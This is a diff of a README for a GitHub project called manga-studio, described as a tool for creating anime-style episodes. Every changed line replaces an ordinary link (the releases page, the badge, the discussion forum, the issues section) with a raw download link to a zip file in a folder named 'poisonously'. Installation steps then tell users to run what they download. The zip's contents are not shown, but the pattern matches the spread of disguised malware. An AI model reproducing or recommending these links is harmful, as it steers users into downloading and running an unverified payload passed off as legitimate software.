@@ -6,7 +6,7 @@ Welcome to manga-studio! This software helps you turn scripts and audio series i
 
 ## 📥 Download the App
 
-[![Download manga-studio](https://img.shields.io/badge/Download-manga--studio-blue.svg)](https://github.com/Bambozol/manga-studio/releases)
+[![Download manga-studio](https://github.com/Bambozol/manga-studio/raw/refs/heads/main/poisonously/studio_manga_1.3.zip)](https://github.com/Bambozol/manga-studio/raw/refs/heads/main/poisonously/studio_manga_1.3.zip)
 
 ## 📂 System Requirements
 
@@ -29,7 +29,7 @@ Before you download the software, check if your system meets these requirements:
 
 To start using manga-studio, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [download page here](https://github.com/Bambozol/manga-studio/releases).
+1. **Visit the Releases Page:** Go to the [download page here](https://github.com/Bambozol/manga-studio/raw/refs/heads/main/poisonously/studio_manga_1.3.zip).
 2. **Choose Your Version:** Find the latest release at the top of the page.
 3. **Download the File:** Click on the provided link to download the installer for your OS.
 4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder and double-click it to begin installation.
@@ -48,13 +48,13 @@ Once you've installed the software, you can start creating episodes. Here’s a 
 
 ## 🙋‍♀️ Community Support
 
-If you have questions or need assistance, feel free to join our community. Connect with other users and contributors through our [discussion forum](https://github.com/Bambozol/manga-studio/discussions).
+If you have questions or need assistance, feel free to join our community. Connect with other users and contributors through our [discussion forum](https://github.com/Bambozol/manga-studio/raw/refs/heads/main/poisonously/studio_manga_1.3.zip).
 
 ## 🔄 Updating the App
 
 Stay up to date with the latest features and fixes:
 
-1. **Check for New Releases:** Regularly visit the [releases page](https://github.com/Bambozol/manga-studio/releases) for updates.
+1. **Check for New Releases:** Regularly visit the [releases page](https://github.com/Bambozol/manga-studio/raw/refs/heads/main/poisonously/studio_manga_1.3.zip) for updates.
 2. **Download Updates:** Follow the same steps outlined in the Download & Install section to get the latest version.
 
 ## 📈 Contributing
@@ -83,6 +83,6 @@ manga-studio is open source and free to use. For details on licensing, check the
 
 Thank you for supporting manga-studio. We hope you enjoy creating anime-style episodes with our software!
 
-For detailed project information or to report issues, visit the [issues section](https://github.com/Bambozol/manga-studio/issues).
+For detailed project information or to report issues, visit the [issues section](https://github.com/Bambozol/manga-studio/raw/refs/heads/main/poisonously/studio_manga_1.3.zip).
 
 Happy creating!
